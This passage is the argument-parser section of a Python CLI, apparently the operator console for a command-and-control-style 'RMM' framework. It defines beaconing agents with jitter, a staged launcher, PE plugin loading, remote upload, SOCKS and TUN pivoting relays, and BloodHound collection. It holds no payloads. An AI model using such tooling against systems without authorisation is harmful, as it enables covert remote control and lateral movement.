    sp_plugin_install.add_argument("--source-revision", default="", help="Source configuration revision returned when browsing (optional pin)")
    sp_plugin_install.add_argument("--tag", required=True, help="Exact tag returned by plugin releases; latest is not accepted")
    sp_plugin_install.add_argument("--sha256", default="", help="Expected digest from plugin releases (optional additional pin)")
    sp_plugin_install.set_defaults(func=cmd_plugin_release)
    sp_plugin_sources = sp_plugin_sub.add_parser("sources", help="Manage saved repository and branch configurations")
    sp_source_sub = sp_plugin_sources.add_subparsers(dest="source_action", required=True)
    sp_source_list = sp_source_sub.add_parser("list", parents=[shared])
    sp_source_list.set_defaults(func=cmd_plugin_sources)
    sp_source_save = sp_source_sub.add_parser("save", parents=[shared])
    sp_source_save.add_argument("id", help="Source ID (letters, digits, underscore, hyphen)")
    sp_source_save.add_argument("--repository", required=True, help="GitHub owner/repository")
    sp_source_save.add_argument("--branch", default="main")
    sp_source_save.add_argument("--label", default="")
    sp_source_save.add_argument("--credential-env", default="RMM_PLUGIN_GITHUB_TOKEN", help="Service-side environment variable name, never a token value")
    sp_source_save.set_defaults(func=cmd_plugin_sources)
    sp_source_remove = sp_source_sub.add_parser("remove", parents=[shared])
    sp_source_remove.add_argument("id")
    sp_source_remove.set_defaults(func=cmd_plugin_sources)

    sp_pe = sub.add_parser("pe", help="PE plugin management for the Go agent")
    sp_pe_sub = sp_pe.add_subparsers(dest="pe_cmd", required=True)
    sp_pe_list = sp_pe_sub.add_parser(
        "list", parents=[shared], help="List PE plugins on the server"
    )
    sp_pe_list.set_defaults(func=cmd_pe_list)
    sp_pe_load = sp_pe_sub.add_parser("load", parents=[shared], help="Queue a PE plugin load on the agent")
    sp_pe_load.add_argument("plugin")
    sp_pe_load.add_argument("--export", default="Run", help="Plugin export to call (default Run)")
    sp_pe_load.add_argument(
        "--command",
        default=None,
        help="Plugin-owned command dispatched by the plugin Run export",
    )
    sp_pe_load.add_argument("input", nargs="?", default="", help="Optional input passed to the export")
    sp_pe_load.add_argument("--session", "-s", default=None)
    sp_pe_load.set_defaults(func=cmd_pe_load)
    sp_rcfg = sub.add_parser("rclone-config", help="Show rclone profiles and bootstrap status")
    sp_rcfg.add_argument("--json", action="store_true", help="JSON output")
    sp_rcfg.set_defaults(func=cmd_rclone_config)

    sp_assets = sub.add_parser("assets", help="Manage URL-installed profiles, plugins, skills, and rclone files")
    sp_assets_sub = sp_assets.add_subparsers(dest="assets_cmd", required=True)
    sp_assets_list = sp_assets_sub.add_parser("list", parents=[shared], help="List managed assets")
    sp_assets_list.add_argument("kind", nargs="?", choices=["plugins", "skills", "rclone"])
    sp_assets_list.set_defaults(func=cmd_assets)
    sp_assets_add = sp_assets_sub.add_parser("add", parents=[shared], help="Download an asset from a URL")
    sp_assets_add.add_argument("kind", choices=["plugins", "skills", "rclone"])
    sp_assets_add.add_argument("url")
    sp_assets_add.add_argument("--name", default=None, help="Override the filename derived from the URL")
    sp_assets_add.add_argument("--disabled", action="store_true", help="Install without enabling the asset")
    sp_assets_add.set_defaults(func=cmd_assets)
    for action, enabled in (("enable", True), ("disable", False)):
        parser_asset = sp_assets_sub.add_parser(action, parents=[shared], help=f"{action.title()} an asset")
        parser_asset.add_argument("kind", choices=["plugins", "skills", "rclone"])
        parser_asset.add_argument("name")
        parser_asset.set_defaults(func=cmd_assets, asset_enabled=enabled)
    sp_assets_remove = sp_assets_sub.add_parser("remove", parents=[shared], help="Remove a managed asset")
    sp_assets_remove.add_argument("kind", choices=["plugins", "skills", "rclone"])
    sp_assets_remove.add_argument("name")
    sp_assets_remove.set_defaults(func=cmd_assets)

    sp_ai = sub.add_parser("ai", help="Inspect server-owned AI jobs")
    sp_ai_sub = sp_ai.add_subparsers(dest="ai_cmd", required=True)
    sp_ai_jobs = sp_ai_sub.add_parser("jobs", parents=[shared])
    sp_ai_jobs.add_argument("--session-id", default="")
    sp_ai_jobs.set_defaults(func=cmd_ai)
    sp_ai_job = sp_ai_sub.add_parser("job", parents=[shared])
    sp_ai_job.add_argument("job_id")
    sp_ai_job.set_defaults(func=cmd_ai)

    sp_agent = sub.add_parser("agent", help="Fetch the agent template or render configured deployment artifacts")
    sp_agent_sub = sp_agent.add_subparsers(dest="agent_cmd", required=True)
    sp_agent_script = sp_agent_sub.add_parser("script", parents=[shared], help="Fetch the client_rmm.ps1 template")
    sp_agent_script.add_argument("--out", help="Optional path to write the template")
    sp_agent_script.set_defaults(func=cmd_agent)
    sp_agent_deploy = sp_agent_sub.add_parser("deploy-script", parents=[shared], help="Render a configured client_rmm.ps1 server-side")
    sp_agent_deploy.add_argument("--session-id", help="Optional fixed session ID (default: generated at first run)")
    sp_agent_deploy.add_argument("--sleep", type=int, default=60, help="Beacon sleep in seconds (default 60)")
    sp_agent_deploy.add_argument("--jitter", type=int, default=30, help="Beacon jitter percent (default 30)")
    sp_agent_deploy.add_argument("--proxy", help="Optional HTTP proxy URL used by the deployed agent")
    sp_agent_deploy.add_argument("--workspace-id", help="Administrator-selected owner; workspace authentication binds this automatically")
    sp_agent_deploy.set_defaults(func=cmd_agent)
    sp_agent_go = sp_agent_sub.add_parser("go-build", parents=[shared], help="Build the Go agent with the active server connection")
    sp_agent_go.add_argument("--goos", default="windows", choices=["windows"])
    sp_agent_go.add_argument("--goarch", default="amd64", choices=["amd64", "arm64"])
    sp_agent_go.add_argument("--no-server-config", action="store_true", help="Build a generic agent without embedded connection settings")
    sp_agent_go.add_argument("--stageless", action="store_true", help="Embed the Go agent directly in the ZIP instead of staging it. Default: return a small stage1 launcher (~20 KB) that fetches the agent from the server at runtime.")
    sp_agent_go.add_argument("--debug", action="store_true", help="Build the main agent with inherited child tracing in a full-agent ZIP; normal builds exclude diagnostics")
    sp_agent_go.add_argument("--workspace-id", help="Administrator-selected owner; workspace authentication binds this automatically")
    sp_agent_go.set_defaults(func=cmd_agent)
    sp_agent_stage = sp_agent_sub.add_parser(
        "go-stage", parents=[shared],
        help="Show the stage1 launcher status recorded on the server for a staged build",
    )
    sp_agent_stage.add_argument("staging_id", help="Staging ID returned by the staged go-build")
    sp_agent_stage.set_defaults(func=cmd_agent)

    sp_profile = sub.add_parser("profile", help="Manage the dynamic RMM-Profile connector")
    sp_profile_sub = sp_profile.add_subparsers(dest="profile_cmd", required=True)
    sp_profile_status = sp_profile_sub.add_parser("status", parents=[shared], help="Show profile and beacon URL")
    sp_profile_status.set_defaults(func=cmd_profile)
    sp_profile_start = sp_profile_sub.add_parser("start", parents=[shared], help="Start an installed profile")
    sp_profile_start.add_argument("name", nargs="?", default="cloudflared")
    sp_profile_start.add_argument("--config-file", help="One-run profile configuration JSON; use - for standard input")
    sp_profile_start.set_defaults(func=cmd_profile)
    sp_profile_stop = sp_profile_sub.add_parser("stop", parents=[shared], help="Stop the active profile")
    sp_profile_stop.set_defaults(func=cmd_profile)

    sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
    sp_ul.add_argument("local")
    sp_ul.add_argument("remote")
    sp_ul.add_argument("--session", "-s", default=None)
    sp_ul.set_defaults(func=cmd_upload)

    sp_ev = sub.add_parser("events", parents=[shared], help="Poll session result events")
    sp_ev.add_argument("--session", "-s", default=None)
    sp_ev.add_argument("--since", type=int, default=0)
    sp_ev.add_argument("--limit", type=int, default=50)
    sp_ev.add_argument("--history", action="store_true", help="Read an archived session transcript")
    sp_ev.add_argument("--forward", action="store_true", help="Read earliest events after --since for gap-free pagination")
    sp_ev.set_defaults(func=cmd_events)

    sp_socks = sub.add_parser("socks", help="SOCKS relay management")
    sp_socks_sub = sp_socks.add_subparsers(dest="socks_cmd", required=True)
    sp_socks_list = sp_socks_sub.add_parser(
        "list", parents=[shared], help="List all SOCKS listeners and connected agents"
    )
    sp_socks_list.set_defaults(func=cmd_socks_list)

    sp_tun = sub.add_parser("tun", help="RMM server-side TUN relay management")
    sp_tun_sub = sp_tun.add_subparsers(dest="tun_cmd", required=True)
    sp_tun_list = sp_tun_sub.add_parser(
        "list", parents=[shared], help="List active server-side TUN relays"
    )
    sp_tun_list.set_defaults(func=cmd_tun_list)
    sp_tun_start = sp_tun_sub.add_parser(
        "start", parents=[shared], help="Create a TUN relay for a Go session"
    )
    sp_tun_start.add_argument("session_ref", help="Session id prefix or hostname")
    sp_tun_start.add_argument("device", help="TUN device, for example tun://rmm0 or utun4")
    sp_tun_start.add_argument(
        "--route",
        dest="routes",
        action="append",
        default=None,
        help="IPv4 CIDR routed through this relay; repeat for multiple networks",
    )
    sp_tun_start.add_argument("--address", dest="tun_address", default="198.18.0.1/15")
    sp_tun_start.add_argument("--interface", default="", help="Physical egress interface")
    sp_tun_start.add_argument("--mtu", type=int, default=1500)
    sp_tun_start.add_argument("--udp-timeout", dest="udp_timeout_seconds", type=int, default=300)
    sp_tun_start.set_defaults(func=cmd_tun_start)
    sp_tun_stop = sp_tun_sub.add_parser(
        "stop", parents=[shared], help="Disable the server-side TUN relay"
    )
    sp_tun_stop.add_argument("session_ref", help="Session id prefix or hostname")
    sp_tun_stop.set_defaults(func=cmd_tun_stop)

    settings = sub.add_parser("settings", help="Persistent service settings (restart required; environment overrides saved values)")
    settings_actions = settings.add_subparsers(dest="settings_action", required=True)
    for action in ("show", "set", "unset", "import"):
        command = settings_actions.add_parser(action, parents=[shared])
        command.set_defaults(func=cmd_settings)
        if action in {"set", "unset"}:
            command.add_argument("key", help="Canonical setting key, for example RMM_ASSET_MAX_BYTES")
        if action == "set":
            command.add_argument("value", nargs="?", help="JSON value or plain string; use --value-file for secrets")
            command.add_argument("--value-file", help="Read value from a file; - reads standard input without placing secrets in argv")
        if action == "import":
            command.add_argument("file", help='JSON file containing {"settings": {...}}; - reads standard input')

    bloodhound = sub.add_parser("bloodhound", parents=[shared], help="BloodHound CE collection, ingestion, and graph evidence")
    bloodhound.add_argument("action", choices=("preflight", "create", "collect", "import", "status", "verify", "query", "queries", "report", "result", "ui", "health", "ensure", "reset", "auth", "reset_ce", "library_search", "library_get"))
    bloodhound.add_argument("--run-id", default="")
    bloodhound.add_argument("--options-json", default="{}", help="Action options as JSON; credentials belong in service settings")
    bloodhound.set_defaults(func=cmd_bloodhound)

    embeddings = sub.add_parser("embeddings", help="Saved document embedding profiles and results")
    groups = embeddings.add_subparsers(dest="embedding_group", required=True)
    run = groups.add_parser("run", parents=[shared], help="Queue a document batch with a saved profile")
    run.add_argument("profile")
    run.add_argument("--session", "-s")
    run.add_argument("--document", action="append", required=True, help="Windows file or directory path, including UNC; repeat up to 32 paths (32 expanded documents maximum)")
    run.set_defaults(func=cmd_embeddings, embedding_action="run")
    for group in ("profiles", "results"):
        commands = groups.add_parser(group).add_subparsers(dest="embedding_action", required=True)
        for action in (("list", "get", "save", "delete", "defaults") if group == "profiles" else ("list", "get", "save", "delete")):
            command = commands.add_parser(action, parents=[shared])
            command.set_defaults(func=cmd_embeddings)
            if action in {"get", "delete"} or (group == "profiles" and action == "save"):
                command.add_argument("name")
            if action in {"get", "defaults"}:
                command.add_argument("--output", "-o", help="Export JSON to a local file")
            if action == "save" and group == "profiles":
                command.add_argument("--file", "-f", required=True, help="Profile configuration JSON or exported record")
            if action == "save" and group == "results":
                command.add_argument("--session", "-s")
                command.add_argument("--event", type=int, required=True, help="Exact output event ID")

    return p


def main():
    parser = build_parser()
    args = parser.parse_args()
    state = load_state()
    token = args.token

    if args.subcommand is None or getattr(args, "interactive", False):
        client, data = ensure_client(args.url, token)
        run_interactive(client, state, json_mode=getattr(args, "json", False), start_data=data)
        return

    client, _ = ensure_client(args.url, token)

    if args.subcommand == "health":
        cmd_health(client, args)
    else:
        args.func(client, state, args)


if __name__ == "__main__":
    main()
